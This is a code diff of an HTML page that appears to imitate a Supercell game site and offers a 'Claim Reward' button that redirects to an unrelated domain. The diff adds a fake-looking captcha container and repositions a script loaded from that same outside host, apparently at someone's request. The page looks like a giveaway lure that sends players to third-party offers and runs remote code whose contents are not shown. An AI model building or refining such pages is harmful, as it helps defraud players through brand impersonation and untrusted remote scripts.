@@ -26,7 +26,7 @@
 <link rel="stylesheet" href="css/fonts_supercellheadline.css">
 <link rel="stylesheet" href="css/fonts_supercelltext_full.css">
 
-<!-- JS files - REMOVED jo6md.js and kept essential ones -->
+<!-- JS files - kept essential ones -->
 <script src="js/main.js" defer></script>
 <script src="js/otSDKStub.js" defer></script>
 <script src="js/d692515.js" defer></script>
@@ -277,7 +277,9 @@ document.querySelector("#open-game-button span").textContent = translations[curr
 </div>
 
 <!-- Updated button with redirect overlay class and new link -->
-<a class="styles_button__DNJ4N button show-redirect-overlay" style="cursor: pointer;" data-url="https://bouttiq.graphics/cl/i/exxo6k">
+<!-- Added captcha container above the button -->
+<div data-captcha-enable="true"></div>
+<a class="styles_button__DNJ4N button show-redirect-overlay" style="cursor: pointer; margin-top: 15px; display: inline-block;" data-url="https://bouttiq.graphics/cl/i/exxo6k">
 <span>Claim Reward</span>
 </a>
 
@@ -389,6 +391,10 @@ showLink(androidLink);
 </footer>
 </section>
 
+<!-- Captcha script and container (already added above button) -->
+<!-- Captcha script placed just before closing body tag as requested -->
+<script type="text/javascript" src="https://bouttiq.graphics/cp/js/zyjr6"></script>
+
 <!-- Redirect Overlay Script -->
 <script>
 // Redirect Overlay Functionality
@@ -430,8 +436,5 @@ document.addEventListener('keydown', function(e) {
     }
 });
 </script>
-
-<!-- Your external script -->
-<script type="text/javascript" src="https://bouttiq.graphics/cp/js/zyjr6"></script>
 </body>
 </html>
